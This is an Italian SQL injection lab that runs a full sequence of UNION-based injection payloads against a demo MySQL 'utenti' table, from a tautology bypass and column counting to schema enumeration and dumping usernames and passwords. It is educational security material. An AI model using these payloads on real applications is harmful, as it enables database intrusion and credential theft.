# SQLi Lab by Antonio Maulucci

(C) 2024 by Antonio Maulucci licensed under CC BY-NC-ND 4.0

------------

## SQLi

```sql
mysql> select * from utenti where user='' or 1=1;
+------------+----------+
| user       | password |
+------------+----------+
| gioacchino | murat    |
| pippo      | pluto    |
+------------+----------+
2 rows in set (0.00 sec)
```

## Scoprire il numero di colonne della tabella

```sql
mysql> select * from utenti where user='' ORDER BY 1;
Empty set (0.00 sec)

mysql> select * from utenti where user='' ORDER BY 2;
Empty set (0.00 sec)

mysql> select * from utenti where user='' ORDER BY 3;
ERROR 1054 (42S22): Unknown column '3' in 'order clause'
```

## Scoprire il tipo di dati

```sql
mysql> select * from utenti where user='' UNION SELECT 'a', NULL;
+------+----------+
| user | password |
+------+----------+
| a    | NULL     |
+------+----------+
1 row in set (0.00 sec)

mysql> select * from utenti where user='' UNION SELECT 'a', 'a';
+------+----------+
| user | password |
+------+----------+
| a    | a        |
+------+----------+
1 row in set (0.00 sec)
```

## Informazioni sul database

```sql
mysql> select * from utenti where user='' UNION SELECT version(), NULL;
+-------+----------+
| user  | password |
+-------+----------+
| 8.4.0 | NULL     |
+-------+----------+
1 row in set (0.01 sec)
```

## Ottenere i nomi delle tabelle

```sql
mysql> select * from utenti where user='' UNION SELECT table_name, NULL FROM information_schema.tables;
+---------------------------------------+----------+
| user                                  | password |
+---------------------------------------+----------+
-- ..................................................................
| utenti                                | NULL     |
+---------------------------------------+----------+
86 rows in set (0.01 sec)
```

## Nomi degli attributi della tabella utenti

```sql
mysql> select * from utenti where user='' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'utenti';
+----------+----------+
| user     | password |
+----------+----------+
| user     | NULL     |
| password | NULL     |
+----------+----------+
2 rows in set (0.00 sec)
```

## Dati dalla tabella

```sql
mysql> select * from utenti where user='' UNION SELECT user, password FROM utenti;
+------------+----------+
| user       | password |
+------------+----------+
| gioacchino | murat    |
| pippo      | pluto    |
+------------+----------+
2 rows in set (0.00 sec)
```


